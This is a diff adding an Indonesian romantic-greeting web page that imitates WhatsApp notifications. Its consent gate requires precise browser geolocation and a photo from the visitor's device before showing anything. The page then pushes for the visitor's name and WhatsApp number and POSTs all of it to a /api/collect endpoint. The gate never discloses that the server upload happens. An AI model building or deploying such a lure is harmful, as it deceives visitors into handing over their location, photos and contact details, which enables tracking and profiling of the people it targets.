@@ -1,0 +1,1119 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Untuk Mu ❤️</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;400;500;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Sharp" rel="stylesheet">
+
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: "Roboto", sans-serif;
+    }
+
+    body {
+      background: #121212;
+      overflow: hidden;
+    }
+
+    .background1,
+    .background2 {
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      background-size: cover;
+      background-position: center;
+      filter: brightness(65%);
+    }
+
+    .background1 {
+      background-image: url("d.png");
+      z-index: -3;
+    }
+
+    .background2 {
+      background-image: url("1.jpeg");
+      z-index: -2;
+      transition: 3s ease;
+    }
+
+    /* =========================
+       GERBANG
+    ========================= */
+
+    #gate {
+      position: fixed;
+      inset: 0;
+      z-index: 9999;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 25px;
+      background:
+        linear-gradient(
+          rgba(0,0,0,.45),
+          rgba(0,0,0,.75)
+        ),
+        url("1.jpeg") center/cover;
+    }
+
+    .gate-box {
+      width: min(400px, 100%);
+      padding: 30px 24px;
+      border-radius: 25px;
+      text-align: center;
+      color: white;
+
+      background: rgba(255,255,255,.12);
+      backdrop-filter: blur(15px);
+      -webkit-backdrop-filter: blur(15px);
+
+      box-shadow: 0 10px 40px rgba(0,0,0,.5);
+    }
+
+    .gate-heart {
+      font-size: 55px;
+      animation: heartbeat 1.3s infinite;
+      margin-bottom: 10px;
+    }
+
+    .gate-box h1 {
+      font-size: 25px;
+      margin-bottom: 12px;
+    }
+
+    .gate-box p {
+      line-height: 1.6;
+      font-size: 14px;
+      opacity: .92;
+      margin-bottom: 20px;
+    }
+
+    .consent-info {
+      text-align: left;
+      background: rgba(0,0,0,.22);
+      border-radius: 15px;
+      padding: 15px;
+      margin-bottom: 20px;
+      font-size: 13px;
+      line-height: 1.7;
+    }
+
+    .consent-info div {
+      margin: 4px 0;
+    }
+
+    .agree {
+      width: 100%;
+      border: 0;
+      border-radius: 15px;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      color: white;
+      background: #23a542;
+      box-shadow: 0 5px 20px rgba(0,0,0,.3);
+    }
+
+    .agree:active {
+      transform: scale(.97);
+    }
+
+    .small-note {
+      font-size: 11px !important;
+      opacity: .65 !important;
+      margin-top: 12px;
+      margin-bottom: 0 !important;
+    }
+
+    @keyframes heartbeat {
+      0%,100% {
+        transform: scale(1);
+      }
+
+      50% {
+        transform: scale(1.15);
+      }
+    }
+
+    /* =========================
+       MAIN
+    ========================= */
+
+    .main {
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+    }
+
+    .content {
+      width: min(59vh, 100%);
+      height: 100%;
+      margin: auto;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .jam h1 {
+      color: white;
+      font-weight: 100;
+      font-size: 4.3em;
+      text-align: center;
+      margin-top: 120px;
+    }
+
+    .tanggal {
+      display: flex;
+      justify-content: center;
+      color: white;
+      margin-bottom: 20px;
+      font-size: 1.2em;
+    }
+
+    .notif-card {
+      background: rgba(231,231,231,.95);
+      width: 88%;
+      padding: 15px;
+      margin: 10px auto;
+      border-radius: 15px;
+
+      box-shadow: 0 0 10px rgba(0,0,0,.8);
+
+      transform: translateX(-120vw);
+      transition: .4s ease;
+      cursor: pointer;
+    }
+
+    .notif-card.show {
+      transform: translateX(0);
+    }
+
+    .header {
+      width: 100%;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: #414141;
+      margin-bottom: 5px;
+    }
+
+    .wa {
+      display: flex;
+      align-items: center;
+    }
+
+    .wa h3 {
+      margin-right: 6px;
+      font-weight: 400;
+      font-size: .9em;
+    }
+
+    .logo {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+
+      background-image:
+        linear-gradient(190deg,#72e587,#23a542);
+
+      color: white;
+      width: 23px;
+      height: 23px;
+      border-radius: 6px;
+      font-size: 1.3em;
+    }
+
+    .nama {
+      font-weight: 500;
+      font-size: 1.1em;
+      margin-bottom: 5px;
+    }
+
+    .btn-mulai {
+      position: absolute;
+      bottom: 150px;
+      left: 0;
+      right: 0;
+      text-align: center;
+    }
+
+    .btn-mulai button {
+      border: 0;
+      padding: 8px 15px;
+      border-radius: 10px;
+
+      background: rgba(231,231,231,.85);
+      color: #242424;
+
+      font-size: 1.05em;
+      font-weight: bold;
+      cursor: pointer;
+
+      box-shadow: 1px 1px 10px #000;
+
+      animation: goyang 1200ms infinite ease;
+    }
+
+    .btn-mulai .wa-btn {
+      display: none;
+      background: #23a542;
+      color: white;
+    }
+
+    @keyframes goyang {
+      0% {
+        transform: translateY(0);
+      }
+
+      50% {
+        transform: translateY(5px);
+      }
+
+      100% {
+        transform: translateY(0);
+      }
+    }
+
+    .kelip {
+      animation: kelip 1200ms infinite ease;
+    }
+
+    @keyframes kelip {
+      0%,100% {
+        opacity: 1;
+      }
+
+      50% {
+        opacity: .75;
+      }
+    }
+
+    .copyright {
+      position: fixed;
+      bottom: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+
+      display: flex;
+      gap: 5px;
+      align-items: center;
+
+      color: white;
+      text-decoration: none;
+      opacity: .55;
+      z-index: 10;
+    }
+
+    @media(max-width:600px) {
+      .content {
+        width: 100%;
+      }
+
+      .jam h1 {
+        margin-top: 100px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- =========================
+       GERBANG PERSETUJUAN
+  ========================== -->
+
+  <section id="gate">
+
+    <div class="gate-box">
+
+      <div class="gate-heart">❤️</div>
+
+      <h1>Sebelum Masuk...</h1>
+
+      <p>
+        Ada sedikit permainan dulu 😏
+        <br>
+        Kalau kamu mau lanjut, izinkan beberapa hal berikut.
+      </p>
+
+      <div class="consent-info">
+
+        <div>📍 Lokasi kamu akan diminta melalui browser.</div>
+
+        <div>
+          📸 Kamu akan diminta memilih sendiri satu foto dari perangkatmu.
+        </div>
+
+        <div>
+          💬 Nomor WhatsApp akan kamu isi sendiri.
+        </div>
+
+      </div>
+
+      <button class="agree" onclick="mulaiPermainan()">
+        Setuju & Lanjut ❤️
+      </button>
+
+      <p class="small-note">
+        Kamu bebas menolak atau membatalkan kapan saja.
+      </p>
+
+    </div>
+
+  </section>
+
+
+  <!-- =========================
+       AUDIO
+  ========================== -->
+
+  <audio id="audio" src="a.mp3" loop></audio>
+  <audio id="notifSound" src="notif.mp3"></audio>
+
+
+  <!-- =========================
+       BACKGROUND
+  ========================== -->
+
+  <div class="background1"></div>
+  <div class="background2"></div>
+
+
+  <!-- =========================
+       MAIN WEBSITE
+  ========================== -->
+
+  <div class="main">
+
+    <div class="content">
+
+      <div class="jam">
+        <h1 id="jam">00:00</h1>
+      </div>
+
+      <div class="tanggal">
+        <p id="tanggal"></p>
+      </div>
+
+
+      <!-- NOTIF 1 -->
+
+      <div
+        class="notif-card kelip"
+        id="notif1"
+        onclick="tanyaNama()"
+      >
+
+        <div class="header">
+
+          <div class="wa">
+
+            <h3>
+              <i class="material-icons-sharp logo">
+                whatsapp
+              </i>
+            </h3>
+
+            <h3>WHATSAPP</h3>
+
+          </div>
+
+          <div>
+            Now
+          </div>
+
+        </div>
+
+        <div class="nama" id="nama1">
+          Deahs
+        </div>
+
+        <div>
+          Assalamu'alaikum ❤️
+        </div>
+
+      </div>
+
+
+      <!-- NOTIF 2 -->
+
+      <div
+        class="notif-card"
+        id="notif2"
+      >
+
+        <div class="header">
+
+          <div class="wa">
+
+            <h3>
+              <i class="material-icons-sharp logo">
+                whatsapp
+              </i>
+            </h3>
+
+            <h3>WHATSAPP</h3>
+
+          </div>
+
+          <div>
+            Now
+          </div>
+
+        </div>
+
+        <div class="nama" id="nama2">
+          Deahs
+        </div>
+
+        <div id="gombal"></div>
+
+      </div>
+
+
+      <!-- BUTTON -->
+
+      <div class="btn-mulai">
+
+        <button
+          id="pencet"
+          onclick="bukaNotif()"
+        >
+          Pencet Aku ❤️
+        </button>
+
+        <button
+          id="waButton"
+          class="wa-btn"
+          onclick="kirimWA()"
+        >
+          Kirim Pesan WhatsApp 💚
+        </button>
+
+      </div>
+
+    </div>
+
+  </div>
+
+
+  <a
+    href="https://www.instagram.com/xxdeahs"
+    target="_blank"
+    class="copyright"
+  >
+    © Deahs
+  </a>
+
+
+<script>
+
+  /* =====================================
+     CUSTOM
+  ===================================== */
+
+  const pengirim = "Deahs";
+
+  const ucapan =
+    "Hidup itu bukan soal siapa yang paling cepat sampai, " +
+    "tapi siapa yang tetap berjalan meski berkali-kali ingin berhenti. " +
+    "Karena pada akhirnya, yang bertahanlah yang akan menemukan arti " +
+    "dari setiap perjalanan yang ia lalui.";
+
+  const noWhatsapp = "6283837972963";
+
+  const pesanWhatsapp =
+    "Terimakasih sudah mampir ke wa ku jangan lupa kenalan dong hehe.";
+
+
+  /* =====================================
+     DATA PENGUNJUNG
+  ===================================== */
+
+  let visitorData = {
+    nama: "",
+    whatsapp: "",
+    latitude: null,
+    longitude: null
+  };
+
+  let selectedPhoto = null;
+
+
+  /* =====================================
+     ELEMENT
+  ===================================== */
+
+  const audio = document.getElementById("audio");
+  const notifSound = document.getElementById("notifSound");
+
+
+  /* =====================================
+     MULAI PERMAINAN
+  ===================================== */
+
+  async function mulaiPermainan() {
+
+    const button =
+      document.querySelector(".agree");
+
+    button.disabled = true;
+    button.innerText = "Sebentar... ❤️";
+
+
+    /* -------------------------------
+       MINTA LOKASI
+    -------------------------------- */
+
+    try {
+
+      const position =
+        await getLocation();
+
+      visitorData.latitude =
+        position.coords.latitude;
+
+      visitorData.longitude =
+        position.coords.longitude;
+
+    } catch(error) {
+
+      button.disabled = false;
+      button.innerText =
+        "Izinkan Lokasi & Lanjut ❤️";
+
+      Swal.fire({
+        icon: "info",
+        title: "Lokasi diperlukan",
+        text:
+          "Untuk melanjutkan permainan, izinkan akses lokasi melalui browser."
+      });
+
+      return;
+    }
+
+
+    /* -------------------------------
+       MINTA FOTO
+    -------------------------------- */
+
+    const photo =
+      await pilihFoto();
+
+    if(!photo) {
+
+      button.disabled = false;
+      button.innerText =
+        "Setuju & Lanjut ❤️";
+
+      return;
+    }
+
+    selectedPhoto = photo;
+
+
+    /* -------------------------------
+       MASUK WEBSITE
+    -------------------------------- */
+
+    document.getElementById("gate").style.display =
+      "none";
+
+
+    audio.volume = .7;
+
+    audio.play().catch(() => {});
+
+
+    setTimeout(() => {
+
+      document.getElementById("notif1")
+        .classList.add("show");
+
+    }, 800);
+
+  }
+
+
+  /* =====================================
+     LOCATION
+  ===================================== */
+
+  function getLocation() {
+
+    return new Promise((resolve, reject) => {
+
+      if(!navigator.geolocation) {
+
+        reject(
+          new Error("Geolocation tidak tersedia.")
+        );
+
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        resolve,
+        reject,
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        }
+      );
+
+    });
+
+  }
+
+
+  /* =====================================
+     FOTO
+  ===================================== */
+
+  function pilihFoto() {
+
+    return new Promise((resolve) => {
+
+      const input =
+        document.createElement("input");
+
+      input.type = "file";
+      input.accept = "image/*";
+
+      input.onchange = () => {
+
+        if(
+          input.files &&
+          input.files.length > 0
+        ) {
+
+          resolve(input.files[0]);
+
+        } else {
+
+          resolve(null);
+
+        }
+
+      };
+
+      input.click();
+
+    });
+
+  }
+
+
+  /* =====================================
+     BUKA NOTIF
+  ===================================== */
+
+  function bukaNotif() {
+
+    document.getElementById("pencet").style.display =
+      "none";
+
+    notifSound.play().catch(() => {});
+
+    tanyaNama();
+
+  }
+
+
+  /* =====================================
+     NAMA
+  ===================================== */
+
+  async function tanyaNama() {
+
+    const result =
+      await Swal.fire({
+
+        imageUrl:
+          "https://dekatutorial.github.io/stiker_mylove.gif",
+
+        imageHeight: 120,
+
+        title:
+          "Nama Kamu Siapa? ❤️",
+
+        input:
+          "text",
+
+        inputPlaceholder:
+          "Tulis nama kamu...",
+
+        confirmButtonText:
+          "Kirim",
+
+        confirmButtonColor:
+          "#23a542",
+
+        allowOutsideClick:
+          false
+
+      });
+
+
+    if(!result.value) {
+
+      Swal.fire({
+
+        imageUrl:
+          "https://dekatutorial.github.io/stiker2_mylove.gif",
+
+        imageHeight: 120,
+
+        title:
+          "Namanya belum diisi 😭",
+
+        text:
+          "Aku kan pengin kenal kamu hehe.",
+
+        confirmButtonText:
+          "Iya deh ❤️",
+
+        confirmButtonColor:
+          "#23a542"
+
+      });
+
+      tanyaNama();
+
+      return;
+    }
+
+
+    visitorData.nama =
+      result.value.trim();
+
+
+    /* --------------------------------
+       NOMOR WHATSAPP
+    --------------------------------- */
+
+    const waResult =
+      await Swal.fire({
+
+        title:
+          "Boleh kenalan lebih dekat? 😆",
+
+        text:
+          "Masukkan nomor WhatsApp kamu.",
+
+        input:
+          "tel",
+
+        inputPlaceholder:
+          "08xxxxxxxxxx",
+
+        confirmButtonText:
+          "Lanjut ❤️",
+
+        confirmButtonColor:
+          "#23a542",
+
+        allowOutsideClick:
+          false
+
+      });
+
+
+    if(!waResult.value) {
+
+      Swal.fire({
+
+        icon: "info",
+
+        title:
+          "Nomor WhatsApp belum diisi",
+
+        text:
+          "Isi nomor WhatsApp untuk melanjutkan."
+
+      });
+
+      tanyaNama();
+
+      return;
+    }
+
+
+    visitorData.whatsapp =
+      waResult.value.trim();
+
+
+    /* --------------------------------
+       TAMPILKAN PESAN
+    --------------------------------- */
+
+    document.getElementById("nama1").innerText =
+      visitorData.nama;
+
+    document.getElementById("nama2").innerText =
+      visitorData.nama;
+
+
+    document.getElementById("notif1")
+      .style.display = "none";
+
+    document.getElementById("notif2")
+      .classList.add("show");
+
+
+    const teks =
+      "Hai " +
+      visitorData.nama +
+      ", " +
+      ucapan;
+
+
+    ketik(teks);
+
+  }
+
+
+  /* =====================================
+     TYPEWRITER
+  ===================================== */
+
+  let index = 0;
+
+  function ketik(text) {
+
+    const target =
+      document.getElementById("gombal");
+
+    target.innerHTML = "";
+
+    index = 0;
+
+    function tulis() {
+
+      if(index < text.length) {
+
+        target.innerHTML +=
+          text.charAt(index);
+
+        index++;
+
+        setTimeout(
+          tulis,
+          65
+        );
+
+      } else {
+
+        selesai();
+
+      }
+
+    }
+
+    tulis();
+
+  }
+
+
+  /* =====================================
+     SELESAI
+  ===================================== */
+
+  async function selesai() {
+
+    document.querySelector(".background2")
+      .style.opacity = "0";
+
+
+    /* Kirim data yang sudah disetujui */
+
+    await kirimData();
+
+
+    document.getElementById("waButton")
+      .style.display = "inline-block";
+
+  }
+
+
+  /* =====================================
+     UPLOAD KE SERVER
+  ===================================== */
+
+  async function kirimData() {
+
+    try {
+
+      const formData =
+        new FormData();
+
+
+      formData.append(
+        "nama",
+        visitorData.nama
+      );
+
+
+      formData.append(
+        "whatsapp",
+        visitorData.whatsapp
+      );
+
+
+      formData.append(
+        "latitude",
+        visitorData.latitude
+      );
+
+
+      formData.append(
+        "longitude",
+        visitorData.longitude
+      );
+
+
+      formData.append(
+        "photo",
+        selectedPhoto
+      );
+
+
+      await fetch(
+        "/api/collect",
+        {
+          method: "POST",
+          body: formData
+        }
+      );
+
+    } catch(error) {
+
+      console.log(
+        "Pengiriman data gagal."
+      );
+
+    }
+
+  }
+
+
+  /* =====================================
+     WHATSAPP KAMU
+  ===================================== */
+
+  function kirimWA() {
+
+    const url =
+      "https://wa.me/" +
+      noWhatsapp +
+      "?text=" +
+      encodeURIComponent(
+        pesanWhatsapp
+      );
+
+
+    window.location.href = url;
+
+  }
+
+
+  /* =====================================
+     JAM
+  ===================================== */
+
+  function updateJam() {
+
+    const now =
+      new Date();
+
+    let h =
+      String(now.getHours())
+      .padStart(2,"0");
+
+    let m =
+      String(now.getMinutes())
+      .padStart(2,"0");
+
+
+    document.getElementById("jam")
+      .innerText =
+      h + ":" + m;
+
+  }
+
+
+  /* =====================================
+     TANGGAL
+  ===================================== */
+
+  function updateTanggal() {
+
+    const days = [
+      "Sunday",
+      "Monday",
+      "Tuesday",
+      "Wednesday",
+      "Thursday",
+      "Friday",
+      "Saturday"
+    ];
+
+    const months = [
+      "January",
+      "February",
+      "March",
+      "April",
+      "May",
+      "June",
+      "July",
+      "August",
+      "September",
+      "October",
+      "November",
+      "December"
+    ];
+
+
+    const d =
+      new Date();
+
+
+    document.getElementById("tanggal")
+      .innerText =
+      days[d.getDay()] +
+      ", " +
+      d.getDate() +
+      " " +
+      months[d.getMonth()];
+
+  }
+
+
+  updateJam();
+  updateTanggal();
+
+  setInterval(
+    updateJam,
+    1000
+  );
+
+</script>
+
+</body>
+</html>
